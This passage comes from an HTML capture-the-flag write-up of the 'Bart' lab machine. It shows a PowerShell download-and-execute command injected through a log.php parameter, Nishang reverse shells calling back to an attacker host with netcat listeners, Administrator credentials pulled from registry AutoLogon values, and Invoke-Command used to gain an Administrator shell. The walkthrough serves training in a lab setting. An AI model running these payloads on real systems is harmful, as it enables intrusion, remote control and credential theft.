+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#locate&nbsp;Invoke-PowerShellTcp.ps1</span><br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>nishang<span style="color:#ff9d00;font-weight:700">/</span>Shells<span style="color:#ff9d00;font-weight:700">/</span>Invoke-PowerShellTcp.ps1<br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cp&nbsp;/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1&nbsp;nishang9001.ps1</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;nishang9001.ps1</span><br>
+                [...]<br>
+                Invoke-PowerShellTcp&nbsp;-Reverse&nbsp;-IPAddress&nbsp;10.10.14.7&nbsp;-Port&nbsp;9001
+            </div>
+        </div><br>
+        <br>
+        Serve the Nishang reverse shell to the target system with a python web server.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;</span><br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And use code execution in <code>log.php</code> to download and execute your reverse shell.<br>
+        My URL query looked like this:<br>
+        <code>http://internal-01.bart.htb/log/log.php?filename=log.php&amp;username=harvey&amp;cmd=powershell.exe -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7:8000/nishang9001.ps1')</code><br>
+        <br>
+        You should see the target download the Nishang shell from your web server<br>
+            <div class="codebox">
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...<br>
+                10.10.10.81&nbsp;-&nbsp;-&nbsp;[08<span style="color:#ff9d00;font-weight:700">/</span>Nov<span style="color:#ff9d00;font-weight:700">/</span>2019&nbsp;11<span style="color:#ff9d00;font-weight:700">:</span>55<span style="color:#ff9d00;font-weight:700">:</span>09]&nbsp;<span style="color:#3ad900;font-weight:400">"GET&nbsp;/nishang9001.ps1&nbsp;HTTP/1.1"</span>&nbsp;200&nbsp;-
+            </div>
+        </div><br>
+        <br>
+        And a few moments later see a connection on your listener!<br>
+            <div class="codebox">
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.7]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.81]&nbsp;49676<br>
+                Windows&nbsp;PowerShell&nbsp;running&nbsp;as&nbsp;user&nbsp;BART$&nbsp;on&nbsp;BART<br>
+                Copyright&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>C<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2015&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\i</span>netpub<span style="color:#333333;font-weight:400">\w</span>wwroot<span style="color:#333333;font-weight:400">\i</span>nternal-01<span style="color:#333333;font-weight:400">\l</span>og&gt;
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc to Administrator</strong></h1>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) Migrate to 64bit PowerShell</strong></h2><br>
+        This caused me a huge headache.<br>
+        The OS is 64bit, but our running instance of PowerShell is 32bit.<br>
+            <div class="codebox">
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\i</span>netpub<span style="color:#333333;font-weight:400">\t</span>emp&gt;&nbsp;[environment]<span style="color:#ff9d00;font-weight:700">::</span>Is64BitOperatingSystem<br>
+                True<br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\i</span>netpub<span style="color:#333333;font-weight:400">\t</span>emp&gt;&nbsp;[environment]<span style="color:#ff9d00;font-weight:700">::</span>Is64BitProcess<br>
+                False
+            </div>
+        </div><br>
+        <br>
+        This will cause huge problems for reconnaissance whilst on the system, like errors/false flags/results not showing up.<br>
+        You need to migrate to 64bit reverse shell.<br>
+        <br>
+        PowerShell on 64bit systems is located in 1 of 2 (potentially both? I'm not sure) places:<br>
+        • <code>C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe</code><br>
+        • <code>C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe</code><br>
+        <br>
+        <code>system32</code>, on 64bit machines, stores 64bit binaries.<br>
+        <code>SysNative</code> is a virtual folder, only available on 64bit systems, which ised used by 32bit applications to access 64bit binaries in the system32 folder.<br>
+        <br>
+        Since we got a 32bit shell initially, the web server must be running as a 32bit process, which means we need to query the SysNative folder to retrieve a 64bit instance of PowerShell.<br>
+        <br>
+        Kill your original shell, and start a listener to receive your new shell.<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nc&nbsp;-lvnp&nbsp;9001</span><br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Retrieve your shell again via <code>log.php</code>, this time specifying powershell.exe in SysNative.<br>
+        My URL query looked like this:<br>
+        <a href="http://internal-01.bart.htb/log/log.php?filename=log.php&username=harvey&cmd=C:/Windows/SysNative/WindowsPowerShell/v1.0/powershell.exe%20-c%20IEX%20(New-Object%20Net.WebClient).downloadString(%27http://10.10.14.7:8000/nishang9001.ps1%27)">http://internal-01.bart.htb/log/log.php?filename=log.php&amp;username=harvey&amp;cmd=C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe%20-c%20IEX%20(New-Object%20Net.WebClient).downloadString(%27http://10.10.14.7:8000/nishang9001.ps1%27)</a><br>
+        <br>
+        You should receive a connection on your listener, and a 64bit shell!<br>
+            <div class="codebox">
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.7]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.81]&nbsp;49696<br>
+                Windows&nbsp;PowerShell&nbsp;running&nbsp;as&nbsp;user&nbsp;BART$&nbsp;on&nbsp;BART<br>
+                Copyright&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>C<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2015&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\i</span>netpub<span style="color:#333333;font-weight:400">\w</span>wwroot<span style="color:#333333;font-weight:400">\i</span>nternal-01<span style="color:#333333;font-weight:400">\l</span>og&gt;[environment]<span style="color:#ff9d00;font-weight:700">::</span>Is64BitProcess<br>
+                True
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) Auto Logon</strong></h2><br>
+        Check the registry for Auto Logon credentials.<br>
+            <div class="codebox">
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\i</span>netpub<span style="color:#333333;font-weight:400">\w</span>wwroot<span style="color:#333333;font-weight:400">\i</span>nternal-01<span style="color:#333333;font-weight:400">\l</span>og&gt;&nbsp;reg&nbsp;query&nbsp;<span style="color:#3ad900;font-weight:400">"HKLM\SOFTWARE\Microsoft\Windows&nbsp;NT\Currentversion\Winlogon"</span><br>
+                <br>
+                HKEY_LOCAL_MACHINE<span style="color:#333333;font-weight:400">\S</span>OFTWARE<span style="color:#333333;font-weight:400">\M</span>icrosoft<span style="color:#333333;font-weight:400">\W</span>indows&nbsp;NT<span style="color:#333333;font-weight:400">\C</span>urrentversion<span style="color:#333333;font-weight:400">\W</span>inlogon<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;[...]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;LastUsedUsername&nbsp;&nbsp;&nbsp;&nbsp;REG_SZ&nbsp;&nbsp;&nbsp;&nbsp;Administrator<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;DefaultPassword&nbsp;&nbsp;&nbsp;&nbsp;REG_SZ&nbsp;&nbsp;&nbsp;&nbsp;3130438f31186fbaf962f407711faddb
+            </div>
+        </div><br>
+        <br>
+        Administrator has their credentials stored in Auto Logon!<br>
+        <code>Administrator / 3130438f31186fbaf962f407711faddb</code><br>
+        <br>
+        PowerShell doesn't have a <code>su</code> function, so switching to or running commands as Administrator is more difficult than it should be.<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) Run commands as Administrator</strong></h2><br>
+        Windows doesn't like your passing passwords as plaintext, so you have to convert them to a SecureString and store it in a variable.<br>
+            <div class="codebox">
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\i</span>netpub<span style="color:#333333;font-weight:400">\w</span>wwroot<span style="color:#333333;font-weight:400">\i</span>nternal-01<span style="color:#333333;font-weight:400">\l</span>og&gt;&nbsp;<span style="color:#7f0044;font-weight:400">$passwordHere</span>&nbsp;=&nbsp;ConvertTo-SecureString&nbsp;<span style="color:#3ad900;font-weight:400">'3130438f31186fbaf962f407711faddb"'</span>&nbsp;-AsPlainText&nbsp;-Force<br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\i</span>netpub<span style="color:#333333;font-weight:400">\w</span>wwroot<span style="color:#333333;font-weight:400">\i</span>nternal-01<span style="color:#333333;font-weight:400">\l</span>og&gt;&nbsp;<span style="color:#7f0044;font-weight:400">$credsHere</span>&nbsp;=&nbsp;New-Object&nbsp;System.Management.Automation.PSCredential<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'BART\Administrator'</span>,&nbsp;<span style="color:#7f0044;font-weight:400">$passwordHere</span><span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        The easiest way I thought of to get a shell as Administrator was to send myself one.<br>
+        <br>
+        Start a listener on your attacking machine (on a different port than the one your existing shell is currently running on)<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nc&nbsp;-lvnp&nbsp;9002</span><br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        Copy Nishang's Invoke-PowerShellTcp.ps1 to a working directory and edit the last line of the script to send a reverse shell back to you.<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cp&nbsp;/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1&nbsp;nishang9002.ps1</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;nishang9002.ps1&nbsp;</span><br>
+                [...]<br>
+                Invoke-PowerShellTcp&nbsp;-Reverse&nbsp;-IPAddress&nbsp;10.10.14.7&nbsp;-Port&nbsp;9002
+            </div>
+        </div><br>
+        <br>
+        Serve the reverse shell to the target machine with a python web server<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bart<span style="color:#ff9d00;font-weight:700">/</span>serve]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#python&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;</span><br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And to run the reverse shell as Administrator, use <code>Invoke-Command</code>.<br>
+            <div class="codebox">
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\i</span>netpub<span style="color:#333333;font-weight:400">\w</span>wwroot<span style="color:#333333;font-weight:400">\i</span>nternal-01<span style="color:#333333;font-weight:400">\l</span>og&gt;&nbsp;Invoke-Command&nbsp;-ScriptBlock&nbsp;<span style="color:#ff9d00;font-weight:700">{</span>&nbsp;IEX<span style="color:#ff9d00;font-weight:700">(</span>New-Object&nbsp;Net.WebClient<span style="color:#ff9d00;font-weight:700">)</span>.downloadString<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'http://10.10.14.7:8000/nishang9002.ps1'</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">}</span>&nbsp;-Credential&nbsp;<span style="color:#7f0044;font-weight:400">$cred</span>&nbsp;-Computer&nbsp;localhost
+            </div>
+        </div><br>
+        <br>
+        You should receive a reverse shell as Administrator on your listener!<br>
+            <div class="codebox">
+                listening&nbsp;on&nbsp;[any]&nbsp;9002&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.7]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.81]&nbsp;49727<br>
+                Windows&nbsp;PowerShell&nbsp;running&nbsp;as&nbsp;user&nbsp;Administrator&nbsp;on&nbsp;BART<br>
+                Copyright&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>C<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2015&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>ocuments<span style="color:#ffdd00;font-weight:400">&gt;</span><span style="color:#ff9d00;font-weight:700">whoami</span><br>
+                bart<span style="color:#333333;font-weight:400">\a</span>dministrator
+            </div>
+        </div><br>
+        <br>
+        From here you can go grab <code>user.txt</code> and <code>root.txt</code>.<br>
+            <div class="codebox">
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>ocuments&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;..<span style="color:#333333;font-weight:400">\D</span>esktop<br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">type</span>&nbsp;root.txt<br>
+                0074a38e6...<br>
+                <br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop&gt;&nbsp;tree&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>F&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<br>
+                Folder&nbsp;PATH&nbsp;listing<br>
+                Volume&nbsp;serial&nbsp;number&nbsp;is&nbsp;00000010&nbsp;F84E<span style="color:#ff9d00;font-weight:700">:</span>9CF7<br>
+                C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>SERS<br>
+                [...]<br>
+                ????h.potter<br>
+                ?&nbsp;&nbsp;&nbsp;?&nbsp;&nbsp;&nbsp;user.txt<br>
+                ?&nbsp;&nbsp;&nbsp;?&nbsp;&nbsp;&nbsp;<br>
+                ?&nbsp;&nbsp;&nbsp;????Contacts<br>
+                ?&nbsp;&nbsp;&nbsp;????Desktop<br>
+                ?&nbsp;&nbsp;&nbsp;?&nbsp;&nbsp;&nbsp;????test<br>
+                ?&nbsp;&nbsp;&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;index.aspx<br>
+                ?&nbsp;&nbsp;&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;web.config<br>
+                ?&nbsp;&nbsp;&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                ?&nbsp;&nbsp;&nbsp;????Documents<br>
+                ?&nbsp;&nbsp;&nbsp;????Downloads<br>
+                ?&nbsp;&nbsp;&nbsp;????Favorites<br>
+                <br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\h</span>.potter<br>
+                PS&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\h</span>.potter&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">type</span>&nbsp;user.txt<br>
+                625b6c7aa...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
